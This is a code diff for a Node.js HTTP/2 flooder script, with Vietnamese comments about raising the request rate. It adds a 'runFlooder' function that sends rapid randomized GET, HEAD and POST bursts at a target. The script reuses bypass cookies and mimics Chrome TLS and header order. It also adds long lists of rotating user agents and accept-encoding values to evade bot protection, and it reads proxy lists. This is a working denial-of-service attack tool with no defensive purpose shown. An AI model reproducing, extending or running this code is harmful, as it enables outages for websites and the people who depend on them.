@@ -3,7 +3,6 @@ const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const os = require("os");
-const url = require("url");
 const scp = require("set-cookie-parser");
 const crypto = require("crypto");
 const dns = require('dns');
@@ -11,7 +10,7 @@ const fs = require("fs");
 var colors = require("colors");
 const util = require('util');
 const v8 = require("v8");
-
+const url = require("url");
 
 const statusesQ = []
 let statuses = {}
@@ -23,6 +22,111 @@ let custom_update = 15663105;
 let timer = 0;
 
 
+// ** FLOODER - Ho tro POST request **
+async function runFlooder() {
+    const bypassInfo = global.bypassData[Math.floor(Math.random() * global.bypassData.length)];
+    if (!bypassInfo || !bypassInfo.userAgent) return;
+
+    const cookieString = bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ");
+    const advancedHeaders = generateAdvancedBrowserHeaders(bypassInfo.userAgent);
+    const tlsOptions = getAdvancedChromeTlsOptions(parsedTarget);
+
+    const client = http2.connect(args.target, {
+        createConnection: (authority, option) => {
+            return tls.connect({
+                ...tlsOptions,
+                port: 443,
+                host: parsedTarget.host,
+                ALPNProtocols: ['h2'],
+            });
+        },
+        settings: {
+            headerTableSize: 262144,
+            maxConcurrentStreams: 250, // Tang đe xu ly nhieu request
+            initialWindowSize: 10485760,
+            maxHeaderListSize: 8192
+        }
+    });
+
+    const connectionId = Math.random().toString(36).substring(2);
+    global.activeConnections.add(connectionId);
+
+    client.on('connect', async () => {
+        const attackInterval = setInterval(async () => {
+            if (client.destroyed) {
+                clearInterval(attackInterval);
+                return;
+            }
+            try {
+                const requestPromises = Array.from({ length: args.Rate * 2 }, async () => {
+                    await randomDelay(5, 30); // Giam delay đe tang req/s
+                    const paths = [parsedTarget.path, `${parsedTarget.path}/index.html`, `${parsedTarget.path}/api`];
+                    const querySeparator = parsedTarget.path.includes('?') ? '&' : '?';
+                    const pathWithBuster = paths[Math.floor(Math.random() * paths.length)] + querySeparator + generateCacheBuster();
+
+                    const method = Math.random() < 0.6 ? 'GET' : Math.random() < 0.8 ? 'HEAD' : 'POST';
+                    let headers = {
+                        ":method": method,
+                        ":authority": parsedTarget.host,
+                        ":scheme": "https",
+                        ":path": pathWithBuster,
+                        "user-agent": bypassInfo.userAgent,
+                        "cookie": cookieString,
+                        ...advancedHeaders
+                    };
+
+                    if (method === 'POST') {
+                        const payload = generatePostPayload();
+                        headers['content-type'] = payload.startsWith('query=') ? 'application/x-www-form-urlencoded' : 'application/json';
+                        headers['content-length'] = Buffer.byteLength(payload);
+                    }
+
+                    const headerOrder = getBrowserLikeHeaderOrder(method);
+                    headers = buildHeadersInOrder(headers, headerOrder);
+
+                    return new Promise(resolve => {
+                        const req = client.request(headers);
+                        if (method === 'POST') {
+                            req.write(generatePostPayload());
+                        }
+                        req.on('response', (resHeaders) => {
+                            const status = resHeaders[':status'];
+                            if (!global.statuses[status]) global.statuses[status] = 0;
+                            global.statuses[status]++;
+                            global.totalRequests = (global.totalRequests || 0) + 1;
+                            global.methodStats[method] = (global.methodStats[method] || 0) + 1;
+                            req.close();
+                            resolve();
+                        });
+                        req.on('error', () => {
+                            if (!global.statuses["ERROR"]) global.statuses["ERROR"] = 0;
+                            global.statuses["ERROR"]++;
+                            global.totalRequests = (global.totalRequests || 0) + 1;
+                            global.methodStats[method] = (global.methodStats[method] || 0) + 1;
+                            req.close();
+                            resolve();
+                        });
+                        req.end();
+                    });
+                });
+
+                await Promise.all(requestPromises);
+            } catch (e) {}
+        }, 400); // Giam interval đe tang req/s
+
+        setTimeout(() => {
+            clearInterval(attackInterval);
+            client.close();
+        }, 30000);
+    });
+
+    const cleanup = () => {
+        global.activeConnections.delete(connectionId);
+        client.destroy();
+    };
+    client.on('error', cleanup);
+    client.on('close', cleanup);
+}
 
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers = "GREASE:" + [
@@ -37,6 +141,8 @@ function getRandomTLSCiphersuite() {
 		'TLS_AES_128_CCM_SHA256',
 		'TLS_AES_256_GCM_SHA384',
 		'TLS_AES_128_GCM_SHA256',
+	'ECDHE-ECDSA-AES256-GCM-SHA384',
+	 'ECDHE-RSA-AES256-GCM-SHA384',
   ];
 
   const randomCiphersuite = tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];
@@ -77,14 +183,19 @@ const accept_header = [
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
-     'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+     'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
-     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
-  ],
-
+      "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/json;q=0.9",
+  "text/html, application/xhtml+xml, application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.8",
+  "application/json, text/plain, */*",
+  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.7",
+  "application/json, text/plain, */*;q=0.7",
+ ],
+ 
   cache_header = [
     'max-age=0',
     'no-cache',
@@ -279,12 +390,6 @@ crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
  var proxies = readLines(args.proxyFile);
  const parsedTarget = url.parse(args.target);
 
-
-
-
-
-
-
 const targetURL = parsedTarget.host;
 const MAX_RAM_PERCENTAGE = 95;
 const RESTART_DELAY = 1000;
@@ -430,8 +535,12 @@ const getRandomBrowser = () => {
  const userAgent6 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edg/${browserVersion}.0.0.0`;
  const userAgent7 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.2352.52 Safari/537.36 Edg/${browserVersion}.0.527.106`;
  const userAgent9 = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/${browserVersion}.0.4577.63 Safari/537.36`;
-const userAgent10 = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(12 + Math.random() * 4)}_${Math.floor(0 + Math.random() * 4)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(12 + Math.random() * 4)}.0 DuckDuckGo/7 Safari/605.1.15`
-    const secChUa = `${brandValue}`;
+const userAgent10 = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(12 + Math.random() * 4)}_${Math.floor(0 + Math.random() * 4)}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${Math.floor(12 + Math.random() * 4)}.0 DuckDuckGo/7 Safari/605.1.15`;
+ const userAgent11 =  `Mozilla/5.0 (iPad; CPU OS ${getRandomInt(10, 17)}_${getRandomInt(0, 7)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${getRandomInt(10, 17)}.0 Mobile/15E148 Safari/604.1`;
+const userAgent12 = `Mozilla/5.0 (Linux; Android ${getRandomInt(4, 14)}; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Mobile Safari/537.36`;
+const userAgent13 =    `Mozilla/5.0 (Linux; Android ${getRandomInt(4, 14)}; Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Safari/537.36`;
+const userAgent14 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/123.0 Mobile/15E148 Safari/605.1.15';
+ const secChUa = `${brandValue}`;
 const u = [
 userAgent,
 userAgent1,
@@ -439,8 +548,12 @@ userAgent3,
 userAgent5,
 userAgent6,
 userAgent7,
-userAgent9
-userAgent10
+userAgent9,
+userAgent10,
+userAgent11,
+userAgent12,
+userAgent13,
+userAgent14,
 ];
 
 function cookieString(cookie) {
@@ -495,7 +608,7 @@ const randstrsValue = randstrs(10);
     const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
     let interval
     	if (args.input === 'flood') {
-	  interval = 100;
+	  interval = 110;
 	} 
   else if (args.input === 'bypass') {
 	  function randomDelay(min, max) {
@@ -531,6 +644,17 @@ const randstrsValue = randstrs(10);
   'deflate',
   'gzip, deflate, lzma, sdch',
   'deflate',
+  'lz4', 'lzma', 'xz', 'zlib',
+      'gzip, br', 'gzip, deflate', 'gzip, zstd', 'gzip, lz4', 'gzip, lzma',
+    'gzip, xz', 'gzip, zlib', 'br, deflate', 'br, zstd', 'br, lz4',
+    'br, lzma', 'br, xz', 'br, zlib', 'deflate, zstd', 'deflate, lz4',
+    'deflate, lzma', 'deflate, xz', 'deflate, zlib', 'zstd, lz4',
+    'zstd, lzma', 'zstd, xz', 'zstd, zlib', 'lz4, lzma', 'lz4, xz',
+    'lz4, zlib', 'lzma, xz', 'lzma, zlib', 'xz, zlib',
+    'gzip, br, deflate', 'gzip, br, zstd', 'gzip, br, lz4', 'gzip, br, lzma',
+    'gzip, br, xz', 'gzip, br, zlib', 'gzip, deflate, zstd', 'gzip, deflate, lz4',
+    'gzip, deflate, lzma', 'gzip, deflate, xz', 'gzip, deflate, zlib', 'gzip, zstd, lz4',
+    'gzip, zstd, lzma', 'gzip, zstd, xz', 'gzip, zstd, zlib', 'gzip, lz4, lzma',
   ];
 
   function randstrr(length) {
@@ -585,7 +709,7 @@ let headers = {
     "accept": randomElement([
         "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/jpeg,*/*;q=0.8",
         "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     ]),
     "accept-encoding": randomElement([
         "gzip, deflate, br, zstd",
